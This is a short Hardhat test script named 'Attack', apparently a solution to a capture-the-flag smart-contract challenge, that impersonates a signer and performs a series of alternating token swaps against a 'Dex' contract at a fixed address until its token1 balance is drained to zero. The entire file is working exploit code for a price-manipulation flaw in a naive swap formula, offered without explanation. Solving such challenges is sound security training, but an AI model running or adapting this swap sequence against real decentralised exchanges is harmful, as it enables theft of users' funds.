import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", () => {
  it("Should work", async () => {
    const attacker = await ethers.getImpersonatedSigner(process.env.ADDRESS as string);
    const dex = await ethers.getContractAt("Dex", "0xa4063CaCf573B92b4796f7eA8c41Ed6eEA0203Ee");

    const token1 = await dex.token1();
    const token2 = await dex.token2();

    await dex.connect(attacker).approve(dex.address, ethers.constants.MaxUint256);
    await dex.connect(attacker).swap(token1, token2, await dex.balanceOf(token1, attacker.address));
    await dex.connect(attacker).swap(token2, token1, await dex.balanceOf(token2, attacker.address));
    await dex.connect(attacker).swap(token1, token2, await dex.balanceOf(token1, attacker.address));
    await dex.connect(attacker).swap(token2, token1, await dex.balanceOf(token2, attacker.address));
    await dex.connect(attacker).swap(token1, token2, await dex.balanceOf(token1, attacker.address));
    await dex.connect(attacker).swap(token2, token1, await dex.balanceOf(token2, dex.address));

    expect((await dex.balanceOf(token1, dex.address)).isZero()).to.be.true;
  })
})
